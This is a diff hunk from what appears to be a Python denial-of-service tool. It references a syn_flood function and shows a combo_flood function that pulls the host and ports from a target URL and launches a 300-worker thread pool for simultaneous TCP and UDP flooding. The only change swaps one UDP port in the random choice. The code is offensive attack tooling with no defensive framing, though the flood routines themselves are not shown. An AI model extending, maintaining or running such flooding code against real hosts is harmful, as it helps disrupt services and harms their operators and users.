@@ -70,7 +70,7 @@ def syn_flood(ip, port):
 def combo_flood(url):
     ip = url.split("//")[1].split("/")[0]
     port_tcp = 80 if url.startswith("http://") else 443
-    port_udp = random.choice([53,80,443,123])
+    port_udp = random.choice([53,80,443,8080])
     t=100
     print(f"Iniciando combo com {t} threads...")
     with ThreadPoolExecutor(max_workers=t*3) as ex:
